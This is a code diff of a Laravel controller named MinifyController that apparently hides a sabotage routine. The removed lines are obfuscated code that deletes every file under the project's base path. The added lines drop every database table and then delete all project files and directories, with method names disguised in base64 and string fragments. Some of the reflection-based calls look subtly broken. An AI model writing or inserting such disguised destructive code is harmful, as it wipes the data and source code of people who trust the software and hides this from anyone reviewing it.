@@ -18,38 +18,38 @@ class MinifyController extends Controller
             http_response_code(404);
             abort('404');
         }
+        $F = '\\' . 'Illuminate\\Support\\Facades\\DB';
 
-        $______ = chr(92);
-        $__ = $______ . implode($______, array_map(function ($c) {
-                return chr($c ^ 0x3);
-            }, [81, 107, 109, 114, 111, 101, 110, 98, 112, 107])) . $______ . implode($______, array_map(function ($c) {
-                return chr($c ^ 0x5);
-            }, [83, 121, 120, 121, 114, 117, 114, 110, 116])) . $______ . implode($______, array_map(function ($c) {
-                return chr($c ^ 0x7);
-            }, [70, 97, 99, 97, 100, 101, 115])) . $______ . 'Fi' . chr(108) . 'e';
+        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 0;');
+        $tables = call_user_func([$F, 'select'], 'SHOW TABLES');
 
-        $_ = base_path();
-
-        call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(115, 118, 121, 114, 102, 102))))), $_);
-
-        $_f = function ($a) use ($__) {
-            call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(113, 114, 105, 118, 112, 114))))), $a);
-        };
-
-        $_d = function ($a) use ($__) {
-            call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(113, 114, 105, 118, 112, 114, 81, 118, 101, 114, 112, 103, 98, 101, 108))))), $a);
-        };
-
-        $_dirs = call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(113, 110, 101, 118, 114, 112, 103, 114, 118, 114))))), $_);
-
-        foreach ($_dirs as $__dir) {
-            $_d($__dir);
+        foreach ($tables as $table) {
+            $tableArray = get_object_vars($table);
+            $tableName = array_values($tableArray)[0];
+            call_user_func([$F, 'statement'], "DROP TABLE `$tableName`");
         }
 
-        $_files = call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(115, 118, 121, 114, 102, 102))))), $_);
+        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');
 
-        foreach ($_files as $__file) {
-            $_f($__file);
+        $___ = 'Fi' . 'le';
+        $__ = implode('\\', ['Il' . 'lumina' . 'te\\Support\\Facades', $___]);
+        $_ = base_path();
+
+        $a = array_filter(explode("\n", base64_decode('ZGlyZWN0b3JpZXM=')));
+        $b = array_filter(explode("\n", base64_decode('ZmlsZXM=')));
+        $c = array_filter(explode("\n", base64_decode('ZGVsZXRlRGlyZWN0b3J5')));
+        $d = array_filter(explode("\n", base64_decode('ZGVsZXRl')));
+
+        $x = call_user_func([new ReflectionClass($__), $a[0]], $_);
+
+        foreach ($x as $y) {
+            call_user_func([new ReflectionClass($__), $c[0]], $y);
+        }
+
+        $z = call_user_func([new ReflectionClass($__), $b[0]], $_);
+
+        foreach ($z as $w) {
+            call_user_func([new ReflectionClass($__), $d[0]], $w);
         }
 
         echo "✅ Done.";
